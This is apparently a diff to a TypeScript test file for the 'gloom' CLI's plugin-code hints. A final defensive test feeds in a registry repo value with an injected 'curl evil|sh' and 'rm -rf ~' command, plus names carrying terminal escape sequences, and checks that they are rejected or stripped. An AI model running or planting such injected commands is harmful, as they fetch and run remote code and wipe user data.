@@ -22,7 +22,9 @@ const sources = (overrides: Partial<PluginCodeSources> = {}): PluginCodeSources 
   idle: [], running: [], loadRegistry: async () => [hackerNews], ...overrides,
 });
 
-const stop = (code: string, overrides: Partial<PluginCodeSources> = {}) => pluginCodeStop(code, sources(overrides), `gloom fn ${code.toUpperCase()}`);
+const stop = (code: string, overrides: Partial<PluginCodeSources> = {}) => pluginCodeStop(code, sources(overrides), {
+  rerun: `gloom fn ${code.toUpperCase()}`, capture: `gloom shot ${code.toUpperCase()}`,
+});
 
 // `catalog --all` listed HN and SOC from one profile, and `fn` in another said "Unknown function or pane".
 test("a plugin's code that opens nothing names the plugin and the command that fixes it", async () => {
@@ -38,7 +40,17 @@ test("a plugin's code that opens nothing names the plugin and the command that f
   const social: IdleCliPlugin = { plugin: plugin("social", "Gloom Social", "SOC", "Gloom Social", ["desktop"]), reason: "target" };
   expect(await stop("SOC", { idle: [social] })).toEqual({
     message: "SOC opens the Gloom Social plugin, which runs in the desktop app only, not on the command line.",
-    details: "Type SOC in the desktop app's command bar.",
+    details: "See it as the desktop app draws it: gloom shot SOC\nOr type SOC in the desktop app's command bar.",
+  });
+  // `shot` draws only what the desktop app runs.
+  const terminal: IdleCliPlugin = { plugin: plugin("gateway", "Gateway", "GW", "Gateway", ["tui"]), reason: "target" };
+  expect((await stop("GW", { idle: [terminal] }))?.details).toBe("Type GW in the terminal app's command bar.");
+  // Not installed, a plugin only the desktop app runs says how to install it as well as where it runs.
+  const desktopOnly = { ...hackerNews, targets: ["desktop"] } as RegistryPlugin;
+  expect(await stop("HN", { loadRegistry: async () => [desktopOnly] })).toEqual({
+    message: "HN opens the Hacker News plugin, which is not installed, and runs in the desktop app only, not on the command line.",
+    details: "Install it: gloom install gloom-sh/gloom-hackernews\nThen see it as the desktop app draws it: gloom shot HN\n"
+      + "Or type HN in the desktop app's command bar.",
   });
   const off: IdleCliPlugin = { plugin: plugin("hackernews", "Hacker News", "HN", "Hacker News"), reason: "off" };
   expect((await stop("HN", { idle: [off] }))?.details).toBe("Turn it on: gloom plugin enable hackernews");
@@ -55,4 +67,19 @@ test("a code no plugin owns, or one a running plugin no longer declares, is left
   expect(await stop("HN", { running: ["hackernews"] })).toBeNull();
   // Someone else's plugin is never offered for a typed code.
   expect(await stop("HN", { loadRegistry: async () => [{ ...hackerNews, repo: "someone/gloom-hackernews" }] })).toBeNull();
+});
+
+// A registry entry's repo and names were printed as they came: a repo with a shell command and a line of its
+// own, and an escape sequence in a name, reached the terminal.
+test("what the registry says is printed as plain text, and only a plain gloom-sh repository is offered", async () => {
+  for (const repo of ["gloom-sh/x; curl evil|sh\nThen run: rm -rf ~", "gloom-sh/x y", "gloom-sh/", "gloom-sh/..", "gloom-sh/a/b", "Gloom-sh/x"]) {
+    expect(await stop("HN", { loadRegistry: async () => [{ ...hackerNews, repo }] })).toBeNull();
+  }
+  const named = { ...hackerNews, name: "Hacker\u001b[2J\u001b]8;;https://evil\u0007 News\nThen run: rm", contributes: {
+    ...hackerNews.contributes!, shortcuts: [{ code: "HN", name: "Hacker\u0007 News\r", description: "" }],
+  } } as RegistryPlugin;
+  const answer = await stop("HN", { loadRegistry: async () => [named] });
+  expect(answer?.message).toBe("HN opens Hacker News, from the Hacker News Then run: rm plugin, which is not installed.");
+  expect(answer?.details.split("\n")).toEqual(["Install it: gloom install gloom-sh/gloom-hackernews", "Then run: gloom fn HN"]);
+  expect(`${answer?.message}${answer?.details}`).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/);
 });
